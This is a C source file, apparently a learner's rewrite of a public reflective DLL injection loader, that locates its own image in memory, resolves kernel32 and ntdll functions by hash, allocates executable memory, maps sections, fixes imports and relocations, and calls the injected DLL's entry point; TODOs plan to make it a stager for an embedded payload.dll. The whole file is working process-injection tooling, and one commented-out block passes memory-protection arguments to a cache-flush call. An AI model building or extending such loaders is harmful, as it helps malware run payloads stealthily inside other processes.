/*
1. Locate the PE headers
2. allocate memory for the image
3. map sections into the new memory
4. apply relocations
5. resolve imports
6. fix protections
7. run TLS callbacks
8. call the module's entry point (DllMain)
*/

// TODO: this file should be a "bootstrapper" .dll that loads the rawbytes that exist in its .data section. These rawbytes should be the payload.dll

// TODO: lots of "extra" variables i added just for better readability that might make code slightly less
// optimized. should probs revert back to fewer's code if i want optimize it in that way again

#include "ReflectiveLoader.h"
#include "GetModuleHandleManual.h"
#include "GetProcAddressManual.h"

#include <intrin.h>


// Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
HINSTANCE hAppInstance = NULL;

#if defined(_MSC_VER)

#pragma intrinsic( _ReturnAddress ) // MSVC only
// __builtin_return_address(0); // GCC/MinGW equivalent?

// This function can not be inlined by the compiler or we will not get the address we expect. Ideally 
// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of 
// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics 
// available (and no inline asm available under x64).
__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }

#elif defined(__GNUC__) || defined(__clang__)

// MinGW/GCC Version for caller()
__attribute__((noinline)) ULONG_PTR caller(void)
{
	    return (ULONG_PTR)__builtin_return_address(0);
}

#else
	#error Unsupported Compiler
#endif



// TODO: this needs extern "C" if i ever plan to use c++
// ReflectiveLoader() function that external stager calls
// DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpReserved)
//DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
DLLEXPORT DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) // TODO: remove WINAPI and replace with __cdecl to prevent name mangling
{

	// NOTE: caller() gives the return address of the instruction that called caller()
	// which basically means it gives us the address to the next line of code in this function?
	// Therefore, this address is going to be somewhere within our injected dll buffer (the dll being the reflective dll)
	// NOTE: unmapped location of the dll 
	ULONG_PTR rawImageBase = caller(); // TODO: rename to rawImageBase or pRawImageBase

	//PIMAGE_NT_HEADERS pNtHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeader;
	LONG ntHeaderOffset;


	// loop through memory backwards searching for our image's base address (image meaning our reflective dll)
	// NOTE: it is called an image because an image is just a PE file loaded/living in memory?
	// we dont need SEH style search as we shouldnt generate any access violations with this
	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)rawImageBase)->e_magic == IMAGE_DOS_SIGNATURE) // NOTE: checks if rawImageBase points to the start of the DOS Header
		{
			// this is just the offset
			ntHeaderOffset = ((PIMAGE_DOS_HEADER)rawImageBase)->e_lfanew; // NOTE: here, pNtHeader isn't a PIMAGE_NT_HEADERS but just an offset to it
			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if (ntHeaderOffset >= sizeof(IMAGE_DOS_HEADER) && ntHeaderOffset < 1024)
			{
				//pNTHeader += rawImageBase; // NOTE: now pNtHeader actually becomes a PIMAGE_NT_HEADERS
				pNtHeader = (PIMAGE_NT_HEADERS)(rawImageBase + ntHeaderOffset);
				// break if we have found a valid MZ/PE header
				if (pNtHeader->Signature == IMAGE_NT_SIGNATURE)
				{
					break;
				}
			}
		}
		rawImageBase--;
	}

	// NOTE: at this point rawImageBase should be where our target.dll (the dll we injected into the process)
	// starts in memory



	// TODO: my code is a lot cleaner but by using a massive while loop like 
	// here: https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c#L125-L262
	// we can resolve everything in one pass through  

	// TODO: i don't think i can use stuff like GetModuleHandleManual/GetProcAddressManual? because i don't have 
	// access yet to the rest of the dll

	// TODO: coring is happening cuz of these functions
	HMODULE kernel32_module = NULL;
	HMODULE ntdll_module = NULL;

	// TODO: remove status and just check if modules aren't NULL?
	DWORD status = RDI_SUCCESS;
	status |= GetModuleHandleManual(KERNEL32DLL_HASH, &kernel32_module);
	status |= GetModuleHandleManual(NTDLLDLL_HASH, &ntdll_module);
	if ((status & 0xF0000000) == 0xE0000000)
	{
		return status;
	}

	if (kernel32_module == NULL || ntdll_module == NULL)
		return RDI_ERR_RESOLVE_DEPS;



	//LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)GetProcAddressManual(kernel32_module, "LoadLibraryA");
	LOADLIBRARYA pLoadLibraryA = NULL;
	// TODO: is this one needed or can i just use GetProcAddressManual? i think i can just use manual
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

	// TODO: casting as (FARPROC*) just seems annoying... fix
	// maybe change back so that GetProcAddressManual returns FARPROC instead of doing pass by ref?
	status |= GetProcAddressManual(kernel32_module, LOADLIBRARYA_HASH, (FARPROC*)&pLoadLibraryA);
	// TODO: is this one needed or can i just use GetProcAddressManual? i think i can just use manual
	status |= GetProcAddressManual(kernel32_module, GETPROCADDRESS_HASH, (FARPROC*)&pGetProcAddress);
	status |= GetProcAddressManual(kernel32_module, VIRTUALALLOC_HASH, (FARPROC*)&pVirtualAlloc);
	status |= GetProcAddressManual(ntdll_module, NTFLUSHINSTRUCTIONCACHE_HASH, (FARPROC*)&pNtFlushInstructionCache);
	if ((status & 0xF0000000) == 0xE0000000)
	{
		return status;
	}

	if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVirtualAlloc == NULL || pNtFlushInstructionCache == NULL)
		return RDI_ERR_RESOLVE_DEPS;
	////////////////////////////////////////////////


	//pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)rawImageBase + ((PIMAGE_DOS_HEADER)rawImageBase)->e_lfanew);
	pNtHeader = (PIMAGE_NT_HEADERS)(rawImageBase + ((PIMAGE_DOS_HEADER)rawImageBase)->e_lfanew); // TODO: this should be fine? 


	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	// NOTE: the base address of the dll we are manually mapping.
	// the kernels base address and later this images newly loaded base address
	// NOTE: this newly allocated memory also lives in the process we injected our reflective dll into
	ULONG_PTR baseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)pNtHeader)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//DWORD sizeofRawData = 0;

	////////////////////////////////////

	// copy over dos header, dos stub, and pe header into baseAddress?
	
	// NOTE: SizeOfHeaders is the size of all the headers (from DosHeader to SectionHeaders)
	//DWORD uiValueA = ((PIMAGE_NT_HEADERS)pNTHeader)->OptionalHeader.SizeOfHeaders; // TODO: rename uiValueA variable
	DWORD sizeOfHeaders = ((PIMAGE_NT_HEADERS)pNtHeader)->OptionalHeader.SizeOfHeaders;


	//ULONG_PTR uiValueB = rawImageBase; // store off address... libraryaddress is the address of where the target dll exist on the disk
	// TODO: rename to srcPtr or srcHeaderPtr
	//ULONG_PTR srcPtr = rawImageBase; // store off address... libraryaddress is the address of where the target dll exist on the disk
	PBYTE srcPtr = (PBYTE)rawImageBase; // store off address... libraryaddress is the address of where the target dll exist on the disk

	//ULONG_PTR uiValueC = baseAddress; // store off address... baseAddress is where we are trying to write our dll into the process we are injecting it into
	// TODO: rename to dstPtr or dstHeaderPtr
	//ULONG_PTR dstPtr = baseAddress;
	PBYTE dstPtr = (PBYTE)baseAddress;

	while(sizeOfHeaders--)
	{
		//*(BYTE *)dstPtr++ = *(BYTE *)srcPtr++; // TODO: change srcPtr and dstPtr to be PBYTE
		*dstPtr++ = *srcPtr++; // TODO: change srcPtr and dstPtr to be PBYTE
	}

	// we get the number of sections in the pe file, so we can write each section into memory 
	WORD nSections = pNtHeader->FileHeader.NumberOfSections;

	// uiValueA = the VA of the first section
	// NOTE: OptionalHeader is the last field in PIMAGE_NT_HEADERS, so when we do 
	// OptionalHeader + SizeOfOptionalHeader we get the address to the first section 
	// header (these section headers point us to where its data lives).
	// NOTE: the SectionHeader "block" in the PE file structure is a table of 
	// every section's (of the pe file) header 
	//sizeOfHeaders = ( (ULONG_PTR)&(pNtHeader)->OptionalHeader + pNtHeader->FileHeader.SizeOfOptionalHeader); // TODO: ?

	//DWORD uiValueD;
	//DWORD sizeofRawData;

	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);


	// NOTE: loop through all the sections in the pe file
	for (USHORT i = 0; i < nSections; ++i, ++pSectionHeader)
	//while (nSections--)
	{
		// uiValueB is the VA for this section
		// NOTE: gets the address of where we want to copy the section's data into (this is the destination)
		// TODO: rename to dstPtr?
		//dstPtr = (baseAddress + ((PIMAGE_SECTION_HEADER)pSectionHeader)->VirtualAddress);
		dstPtr = (PBYTE)(baseAddress + pSectionHeader->VirtualAddress);

		// baseAddressBuffer if the VA for this sections data
		// NOTE: gets the address of the section's data we want to copy (this is the src)
		// TODO: rename to srcPtr?
		//srcPtr = (rawImageBase + ((PIMAGE_SECTION_HEADER)pSectionHeader)->PointerToRawData); 
		srcPtr = (PBYTE)(rawImageBase + pSectionHeader->PointerToRawData); 


		// copy the section over
		// NOTE: how many bytes we need to copy over (this is the section's size)
		DWORD sizeofRawData = pSectionHeader->SizeOfRawData;

		// NOTE: copy over the data for the section 1 byte at a time
		while (sizeofRawData--)
		{
			// TODO: rename both to match above
			//*(BYTE *)dstPtr++ = *(BYTE *)srcPtr++;
			*dstPtr++ = *srcPtr++;
		}
	}
	////////////////////////////////////

	// TODO: DELETE
	//ULONG_PTR rawImageBaseBuffer;
	//ULONG_PTR baseAddressBuffer;

	//uiValueB = the address of the import directory
	// NOTE: at this point, uiValueB is gonna look like this: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory
	// TODO: rename var to pImportDir
	PIMAGE_DATA_DIRECTORY pImportDir = &(pNtHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; // TODO: should check if pImportDir->Size != 0
	// rawImageBaseBuffer = (ULONG_PTR)&(pNTHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	// NOTE: uiValueC should now point to PIMAGE_IMPORT_DESCRIPTOR
	// TODO: rename to PIMAGE_IMPORT_DESCRIPTOR importDesc
	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + ((PIMAGE_DATA_DIRECTORY)pImportDir)->VirtualAddress);
	//baseAddressBuffer = ( baseAddress + ((PIMAGE_DATA_DIRECTORY)rawImageBaseBuffer)->VirtualAddress); // TODO: use different variable here

	ULONG_PTR importModuleBase;
	//DWORD iatAddress; // TODO: change to type PIMAGE_THUNK_DATA?
	PIMAGE_THUNK_DATA iatAddress; // TODO: move declaration to be inside of the for loop
	// itterate through all imports
	// NOTE: Name is an RVA to the name as a string
	// NOTE: we can do this because the import table is NULL-terminated by an array of IMAGE_IMPORT_DESCRIPTOR
	// NOTE: we're looping through all the imports because we're resolving all the imports/dlls that our 
	// reflective dll depends on. (we're resolving by calling getprocaddress)


	// TODO: 

	//while (((PIMAGE_IMPORT_DESCRIPTOR)importDesc)->Name)
	for (; importDesc->Name; ++importDesc)
	{
		// use LoadLibraryA to load the imported module into memory
		// NOTE: at this point, rawImageBase is no longer for the address where our reflective dll exists in memory
		// in the process we injected into. now, rawImageBase will represent the the address of the dll's whos 
		// functions we are trying to resolve 
		importModuleBase = (ULONG_PTR)pLoadLibraryA((LPCSTR)(baseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)importDesc)->Name)); // NOTE: this variable was called rawImageBase (that's what the comments above are referring to)

		if (!importModuleBase) // NOTE: don't think case will evere happen
		{
			continue;
		}

		// uiValueD = VA of the OriginalFirstThunk
		// TODO: should be a ULONG_PTR? using a DWORD would break this when the dll is greater than 4gb (this should never happen tho)
		//DWORD sizeofRawData = (baseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)importDesc)->OriginalFirstThunk);
		PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)(baseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)importDesc)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		iatAddress = (PIMAGE_THUNK_DATA)(baseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)importDesc)->FirstThunk);

		// itterate through all imported functions, importing by ordinal if no name present
		//while (DEREF(iatAddress))
		for (; iatAddress->u1.AddressOfData; ++iatAddress, ++originalThunk)
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			// NOTE: i can remove this if block if ik for certain my compiler isn't only importing by first thunk
			//if (sizeofRawData && ((PIMAGE_THUNK_DATA)sizeofRawData)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			if (originalThunk && (originalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG))
			{
				// get the VA of the modules NT Header
				// TODO: type should be PIMAGE_NT_HEADERS, right? and variable name should be changed
				//uiExportDir = rawImageBase + ((PIMAGE_DOS_HEADER)rawImageBase)->e_lfanew;
				PIMAGE_NT_HEADERS importedNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)importModuleBase + ((PIMAGE_DOS_HEADER)importModuleBase)->e_lfanew);

				// uiNameArray = the address of the modules export directory entry
				//uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
				DWORD dwExportDirRVA = importedNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; // TODO: cast to ULONG_PTR instead? 
				//PIMAGE_DATA_DIRECTORY importedDataDir = &importedNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				// get the VA of the export directory
				//uiExportDir = (rawImageBase + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
				PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)importModuleBase + dwExportDirRVA); // TODO: cast to correct types
				//PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(importModuleBase + importedDataDir->VirtualAddress); // TODO: cast to correct types

				// get the VA for the array of addresses
				//uiAddressArray = (rawImageBase + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);
				// DWORD* uiAddressArray = rawImageBase + pExportDir->AddressOfFunctions; // TODO: cast to a ulong_ptr instead? NOTE: from my apimanager code
				// TODO: rename!
				//PDWORD uiAddressArray = (PDWORD)(importModuleBase + pExportDir->AddressOfFunctions);
				//DWORD* arrayOfFunctionRVAs = (DWORD*)((ULONG_PTR)pModule + pExportDir->AddressOfFunctions);
				PDWORD arrayOfFunctionRVAs = (PDWORD)(importModuleBase + pExportDir->AddressOfFunctions); /// NOTE: this is an array of RVAs as dwords

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				//uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));
				//uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)sizeofRawData)->u1.Ordinal) - pExportDir->Base) * sizeof(DWORD));
				iatAddress->u1.Function = (importModuleBase + arrayOfFunctionRVAs[IMAGE_ORDINAL(originalThunk->u1.Ordinal) - pExportDir->Base]);

				// patch in the address for this imported function
				//DEREF(iatAddress) = (importModuleBase + DEREF_32(uiAddressArray));
			}
			else
			{
				// get the VA of this functions import by name struct
				//PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(baseAddress + DEREF(iatAddress)); // TODO: rename to importFuncAddress?
				PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(baseAddress + iatAddress->u1.AddressOfData);
				// rawImageBaseBuffer = (baseAddress + DEREF(iatAddress)); // TODO: rename to importFuncAddress?

				// use GetProcAddress and patch in the address for this imported function
				//DEREF(iatAddress) = (ULONG_PTR)pGetProcAddress((HMODULE)importModuleBase, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)importByName)->Name);
				iatAddress->u1.Function = (ULONG_PTR)pGetProcAddress((HMODULE)importModuleBase, (LPCSTR)importByName->Name);
			}
		}
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// TODO: 


	///////////////////////////////////////////////////////////
	// NOTE: we don't need to check if the preferred image base is available because since
	// we are using VirtualAlloc to allocate a new memory block, we perform relocations everytime.
	// Using VirtualAlloc means that we will always have memory avaiable to us; however, we wont know 
	// where VirtualAlloc will place the DLL. And most of the time the memory region chosen by Windows
	// (when we call VirtualAlloc) will not match the preferred base in the PE header.

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	// TODO: should rename rawImageBase or use a different variable name. the variable should be called 
	// maybe something like "relocationOffset" or something
	//rawImageBase = baseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
	ULONG_PTR relocationDelta;
	relocationDelta = baseAddress - pNtHeader->OptionalHeader.ImageBase; // TODO: skip relocation logic if relocationDelta returns 0  

	// uiValueB = the address of the relocation directory
	// NOTE: get IMAGE_DATA_DIRECTORY for relocation table. uiValueB is type _IMAGE_DATA_DIRECTORY
	// which has a field called VirtualAddress which gives a relative address to the relocation table
	// relative to the image base
	// TODO: rename to baseRelocDir or pRelocDir
	PIMAGE_DATA_DIRECTORY pRelocDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; // TODO: if pRelocDir->Size == 0, return
	// rawImageBaseBuffer = (ULONG_PTR) & pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// NOTE: relocations are stored in relocation "blocks" IMAGE_BASE_RELOCATION. each
	// relocation block contains a number of different relocations (which can be obtained from SizeOfBlock). 
	// IMAGE_BASE_RELOCATION blocks are a thing so windows doesn't have to store every single relocation
	// needed one after another in a continguous block of memory

	// PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(baseAddress + pRelocDir->VirtualAddress); NOTE: equivalent to relocBlock
	// TODO:

	// check if their are any relocation blocks (IMAGE_BASE_RELOCATION) present
	if (pRelocDir->Size)
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		PIMAGE_BASE_RELOCATION relocBlock = (PIMAGE_BASE_RELOCATION)(baseAddress + ((PIMAGE_DATA_DIRECTORY)pRelocDir)->VirtualAddress);
		// baseAddressBuffer = (baseAddress + ((PIMAGE_DATA_DIRECTORY)pRelocDir)->VirtualAddress);

		// and we itterate through all entries...
		// NOTE: we can do this because windows api says the IMAGE_BASE_RELOCATION blocks are terminated
		// by a NULL relocation block, meaning SizeOfBlock will be 0 when we want to stop looking/relocating
		//while (((PIMAGE_BASE_RELOCATION)relocBlock)->SizeOfBlock)
		for (; relocBlock->SizeOfBlock; relocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)relocBlock + relocBlock->SizeOfBlock))
		{
			// uiValueA = the VA for this relocation block
			//iatAddress = (baseAddress + ((PIMAGE_BASE_RELOCATION)relocBlock)->VirtualAddress);
			ULONG_PTR relocBlockBase = (ULONG_PTR)(baseAddress + ((PIMAGE_BASE_RELOCATION)relocBlock)->VirtualAddress); // relocBlockBaseAddress

			// uiValueB = number of entries in this relocation block
			// TODO:
			ULONG numRelocs = (((PIMAGE_BASE_RELOCATION)relocBlock)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC); // TODO: should this be DWORD?
			// rawImageBaseBuffer = (((PIMAGE_BASE_RELOCATION)baseAddressBuffer)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			//sizeofRawData = (ULONG_PTR)((ULONG_PTR)relocBlock + sizeof(IMAGE_BASE_RELOCATION));
			PIMAGE_RELOC pReloc = (PIMAGE_RELOC)((ULONG_PTR)relocBlock + sizeof(IMAGE_BASE_RELOCATION));

			// we itterate through all the entries in the current block...
			//while (numRelocs--)
			for (ULONG i = 0; i < numRelocs; ++i, ++pReloc)
			{

				// TODO: make type casts in this if block more readable
				if (pReloc->type == IMAGE_REL_BASED_DIR64)
				{
					*(ULONG_PTR*)((ULONG_PTR)relocBlockBase + pReloc->offset) += relocationDelta;
				}
				else if (pReloc->type == IMAGE_REL_BASED_HIGHLOW)
				{
					*(DWORD*)((ULONG_PTR)relocBlockBase + pReloc->offset) += (DWORD)relocationDelta;
				}
				else if (pReloc->type == IMAGE_REL_BASED_HIGH)
				{
					*(WORD*)((ULONG_PTR)relocBlockBase + pReloc->offset) += HIWORD(relocationDelta);
				}
				else if (pReloc->type == IMAGE_REL_BASED_LOW)
				{
					*(WORD*)((ULONG_PTR)relocBlockBase + pReloc->offset) += LOWORD(relocationDelta);
				}

				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				/*
				if (((PIMAGE_RELOC)sizeofRawData)->type == IMAGE_REL_BASED_DIR64) // relocations for 64bit only
				{
					*(ULONG_PTR*)(iatAddress + ((PIMAGE_RELOC)sizeofRawData)->offset) += relocationDelta;
				}
				else if (((PIMAGE_RELOC)sizeofRawData)->type == IMAGE_REL_BASED_HIGHLOW) // relocations for 32bit only (if the dll is compiled in 32bit)
				{
					*(DWORD*)(iatAddress + ((PIMAGE_RELOC)sizeofRawData)->offset) += (DWORD)relocationDelta;
				}
				else if (((PIMAGE_RELOC)sizeofRawData)->type == IMAGE_REL_BASED_HIGH) // TODO: remove this? this is only needed in very old legacy 32bit relocations
				{
					*(WORD*)(iatAddress + ((PIMAGE_RELOC)sizeofRawData)->offset) += HIWORD(relocationDelta);
				}
				else if (((PIMAGE_RELOC)sizeofRawData)->type == IMAGE_REL_BASED_LOW) // TODO: remove this? this is only needed in very old legacy 32bit relocations
				{
					*(WORD*)(iatAddress + ((PIMAGE_RELOC)sizeofRawData)->offset) += LOWORD(relocationDelta);
				}*/

				// get the next entry in the current relocation block
				//sizeofRawData += sizeof(IMAGE_RELOC);
			}

			// get the next entry in the relocation directory
			//relocBlock = relocBlock + ((PIMAGE_BASE_RELOCATION)relocBlock)->SizeOfBlock;
		}
	}
	////////////////////////////////////////////////////////////////////////
	//
	// 
	// 
	// 
	// 
	// 
	// 
	// 
	// 
	// 
	/*
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
	for (USHORT i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++, pSectionHeader++)
	{
		PVOID pSectionBase = (PVOID)(baseAddress + pSectionHeader->VirtualAddress);
		SIZE_T dwSectionSize = pSectionHeader->Misc.VirtualSize;
		DWORD dwProtect = 0, dwOldProtect;
		// Characteristics processing courtesy of Dark Vort∑x, 2021-06-01
		// See: https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/
		DWORD characteristics = pSectionHeader->Characteristics;

		if (dwSectionSize == 0)
			continue;

		// Map PE section characteristics to Windows memory protection constants.
		if (characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			if (characteristics & IMAGE_SCN_MEM_READ)
				dwProtect = (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
			else
				dwProtect = (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_WRITECOPY : PAGE_EXECUTE;
		}
		else
		{
			if (characteristics & IMAGE_SCN_MEM_READ)
				dwProtect = (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
			else if (characteristics & IMAGE_SCN_MEM_WRITE)
				dwProtect = PAGE_WRITECOPY;
			else
				dwProtect = PAGE_NOACCESS;
		}

		pNtFlushInstructionCache((HANDLE)-1, pSectionBase, dwSectionSize, dwProtect, dwOldProtect);
		//rdiNtProtectVirtualMemory(&pContext->Syscalls[SyscallIndexProtectVirtualMemory], (HANDLE)-1, &pSectionBase, &dwSectionSize, dwProtect, &dwOldProtect);
	}*/

	////////////////////////////////////////////////////////////////////////
	// 
	// 
	// STEP 6: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	//iatAddress = (baseAddress + pNtHeader->OptionalHeader.AddressOfEntryPoint); // TODO: rename variable
	ULONG_PTR entryAddress = (baseAddress + pNtHeader->OptionalHeader.AddressOfEntryPoint); // TODO: rename variable

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

	// call our respective entry point, fudging our hInstance value
	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
	((DLLMAIN)entryAddress)((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, lpParameter); // TODO: breaking here? 

	// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
	return entryAddress; 

}

// TODO: HMODULE and HINSTANCE are the same... so choose one to use and change the rest for consitency
/*
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_QUERY_HMODULE:
		MessageBoxA(NULL, "Inside loader.dll::DLL_QUERY_HMODULE()", "Debug", MB_OK);
		if (lpReserved != NULL)
		{
			*(HMODULE*)lpReserved = hAppInstance;
		}
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		MessageBoxA(NULL, "Inside loader.dll::DLL_PROCESS_ATTACH()", "Debug", MB_OK);
		break;
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		// hAppInstance = hModule;
		break;
	case DLL_PROCESS_DETACH:
		if (lpReserved != NULL)
		{
			break; // do not do cleanup if process termination scenario
		}
		// Perform any necessary cleanup.
		break;
	}
    return TRUE;
}*/


/*

TODO: load data that exists 
LoadEngineThread();
    - locates the engine dll bytes inside host.dll's memory storeage

MapModuleFromMemory();

EngineEntry() optional export inide engine dllpoint 


*/
